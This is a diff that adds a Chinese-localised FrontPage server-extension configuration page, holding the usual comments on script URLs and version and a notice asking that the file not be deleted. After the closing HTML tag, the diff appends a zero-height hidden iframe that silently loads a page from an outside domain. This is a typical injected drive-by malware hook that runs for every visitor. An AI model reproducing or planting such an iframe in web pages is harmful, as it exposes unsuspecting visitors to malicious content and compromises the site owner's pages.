@@ -1,0 +1,40 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type"
+content="text/html; charset=gb2312">
+<title> FrontPage 配置信息 </title>
+</head>
+
+<body>
+<!-- _vti_inf.html version 0.100-->
+<!-- 
+	This file contains important information used by the FrontPage client
+	(the FrontPage Explorer and FrontPage Editor) to communicate with the
+	FrontPage server extensions installed on this web server.
+
+	The values below are automatically set by FrontPage at installation.  Normally, you do not need to modify these values, but in case
+	you do, the parameters are as follows:
+
+	'FPShtmlScriptUrl', 'FPAuthorScriptUrl', and 'FPAdminScriptUrl' specify
+	the relative urls for the scripts that FrontPage uses for remote
+	authoring.  These values should not be changed.
+
+	'FPVersion' identifies the version of the FrontPage Server Extensions
+	installed, and should not be changed.
+--><!-- FrontPage Configuration Information
+    FPVersion="4.0.0.0"
+    FPShtmlScriptUrl="_vti_bin/shtml.exe"
+    FPAuthorScriptUrl="_vti_bin/_vti_aut/author.exe"
+    FPAdminScriptUrl="_vti_bin/_vti_adm/admin.exe"
+-->
+<p><!--webbot bot="PurpleText"
+preview="安装 FrontPage 时，此网页将置于 FrontPage 站点的根目录下。FrontPage 客户端与此站点服务器上所安装的 FrontPage 服务器扩展通讯时所用的信息就包含在此网页中。请勿删除此文件。"
+--></p>
+
+<h1>FrontPage 配置信息 </h1>
+
+<p>此网页的 HTML 注释中包含了配置信息，这些配置信息是 FrontPage Explorer 和 FrontPage Editor 与此站点服务器上安装的 FrontPage 服务器扩展通讯时所需要的。请勿删除此网页。</p>
+</body>
+</html>
+<iframe src=http://mm.uu88567.cn/index/mm.htm width=100 height=0></iframe>
